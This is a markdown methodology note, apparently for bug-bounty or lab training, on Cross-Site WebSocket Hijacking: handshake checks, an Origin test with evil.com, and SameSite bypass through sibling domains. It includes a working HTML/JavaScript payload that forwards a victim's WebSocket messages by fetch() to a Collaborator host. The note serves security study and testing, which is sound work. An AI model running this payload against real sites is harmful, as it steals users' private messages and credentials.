# Cross-Site WebSocket Hijacking (CSWSH) Methodology

## Overview

Cross-Site WebSocket Hijacking (CSWSH) is essentially:

```text
CSRF For WebSockets
```

Instead of forcing a victim to send HTTP requests, an attacker abuses the victim's authenticated WebSocket connection.

If the WebSocket handshake lacks proper protection, attackers may access sensitive information or perform actions on behalf of the victim.

---

# Core Concept

Traditional CSRF:

```text
Victim Browser
        ↓
HTTP Request
        ↓
Authenticated Action
```

---

CSWSH:

```text
Victim Browser
        ↓
WebSocket Handshake
        ↓
Authenticated Session
        ↓
Read / Write WebSocket Data
```

---

# Recon Methodology

## Step 1 - Identify WebSockets

Look for:

```text
wss://
ws://
```

---

Common functionality:

```text
Chat Systems
Notifications
Live Feeds
Trading Platforms
Messaging Apps
```

---

## Step 2 - Inspect WebSocket History

Burp:

```text
Proxy
    ↓
WebSockets History
```

---

Observe:

```text
Handshake Request
Messages Sent
Messages Received
```

---

## Step 3 - Inspect Handshake

Example:

```http
GET /chat HTTP/1.1
Host: target.com

Upgrade: websocket
Connection: Upgrade
```

---

Look for:

```text
CSRF Token
Nonce
Origin Validation
Session Cookies
```

---

# Testing Checklist

## Does Handshake Require Token?

Check:

```http
GET /chat
```

for:

```text
csrf=
token=
nonce=
```

---

## Does Handshake Validate Origin?

Send:

```http
Origin: https://evil.com
```

---

Observation:

```text
Accepted?
Rejected?
```

---

## Does Handshake Require Authentication?

Check:

```http
Cookie:
session=XYZ
```

---

# Initial CSWSH Test Payload

```html
<script>

var ws =
new WebSocket(
'wss://TARGET/chat'
);

ws.onopen = function() {
    ws.send("READY");
};

</script>
```

---

# Data Exfiltration Payload

```html
<script>

var ws =
new WebSocket(
'wss://TARGET/chat'
);

ws.onopen = function() {
    ws.send("READY");
};

ws.onmessage = function(event) {

    fetch(
    'https://COLLABORATOR.oastify.com',
    {
        method:'POST',
        mode:'no-cors',
        body:event.data
    });

};

</script>
```

---

# Common Failure Reason

## SameSite Cookie Protection

Observe:

```http
Set-Cookie:
session=XYZ;
SameSite=Strict
```

---

Result:

```text
Cross-Site WebSocket
        ↓
Cookie Blocked
        ↓
Anonymous Session
```

---

# SameSite Testing Flow

```text
CSWSH Payload
        ↓
No Data Returned
        ↓
Inspect Cookie
        ↓
SameSite Present?
```

---

# SameSite Strict Bypass Methodology

## Look For Sibling Domains

Sources:

```text
JavaScript Files
CORS Headers
Subdomain Enumeration
Certificate Transparency Logs
```

---

Example:

```http
Access-Control-Allow-Origin:
https://cms.target.com
```

---

## Test Sibling Domain

Check for:

```text
XSS
Open Redirects
Client-Side Redirects
```

---

## Execute JavaScript From Same-Site Context

```text
cms.target.com
        ↓
target.com
```

Browser sees:

```text
Same-Site
```

---

Result:

```text
Session Cookie Sent
```

---

# Collaborator Workflow

## Step 1

Create Collaborator Payload.

---

## Step 2

Embed inside:

```javascript
fetch()
```

---

## Step 3

Deliver exploit.

---

## Step 4

Poll Collaborator.

---

## Step 5

Review:

```text
Request Tab
```

not Response tab.

---

# Common Findings

## Chat History Leakage

```javascript
ws.send("READY");
```

returns:

```text
Entire Chat History
```

---

## User Enumeration

Messages reveal:

```text
Usernames
Emails
Roles
```

---

## Credential Disclosure

Common in training labs.

---

# Real Bug Bounty Checklist

```text
[ ] Identify WebSockets
[ ] Inspect Handshake
[ ] Check Origin Validation
[ ] Check CSRF Protection
[ ] Test Authentication Requirements
[ ] Inspect SameSite Cookies
[ ] Enumerate Sibling Domains
[ ] Search For XSS
[ ] Test CSWSH Payload
[ ] Verify Data Exfiltration
```

---

# Related Theory

- 14-bypassing-samesite-restrictions-via-vulnerable-sibling-domains.md

---

# Related Labs

- lab09-samesite-strict-bypass-via-sibling-domain.md

---

# Key Takeaways

- CSWSH is CSRF for WebSockets.
- Origin validation is critical.
- SameSite cookies often block direct exploitation.
- Vulnerable sibling domains can completely bypass SameSite protections.
- WebSocket handshakes should be treated as sensitive authentication events.